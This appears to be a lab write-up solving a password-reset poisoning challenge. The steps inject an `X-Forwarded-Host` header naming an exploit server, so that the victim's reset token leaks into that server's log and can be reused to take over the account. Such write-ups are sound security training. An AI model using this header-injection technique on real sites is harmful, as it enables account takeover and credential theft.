# Password-Reset-Poisoning-Via-Middleware

## Challenge Information

* **Category**: Authentication
* **Level**: Practitioner (Level-2)

## Initial Analysis

Burp was left running while the password reset flow was inspected. Requesting a reset for an account produced an email containing a `temp-forgot-password-token` query parameter in the link — the usual reset pattern. The next step was to check whether that token could be forced to appear somewhere attacker-controlled.

## Request Analysis

The `POST /forgot-password` request was sent to Repeater for experimentation. While examining headers it became clear the application respected an `X-Forwarded-Host` value, meaning the hostname used when generating the reset link could be influenced. That suggested a way to cause the application to create a reset link pointing at an attacker-controlled domain, which could leak tokens when visited.

## Attack Execution

1. The exploit server provided by the lab was opened and its URL noted (the exploit-server ID was copied).
2. In Burp Repeater, the following header was added (with the lab’s exploit-server ID substituted in):

   ```
   X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
   ```
3. The `username` parameter in the POST body was changed to `carlos` and the request was submitted. This made the app generate a reset link for Carlos that used the exploit server as the host.
4. The exploit server’s access log was monitored. Shortly after, a `GET /forgot-password` request appeared that included Carlos’s `temp-forgot-password-token` as a query parameter; that token was copied from the log.
5. Back in the lab email client, the real reset email (the normal app link) was opened. The `temp-forgot-password-token` value in that URL was replaced with the stolen token from the exploit server log.
6. Loading the modified URL allowed setting a new password for Carlos. After that, logging into Carlos’s account with the new password and visiting **My account** confirmed successful takeover — the lab was solved.

## Vulnerability

**Result**: The host value that can be controlled via the `X-Forwarded-Host` header, demonstrating insecure handling of forwarded host headers and weak validation in the password-reset flow.
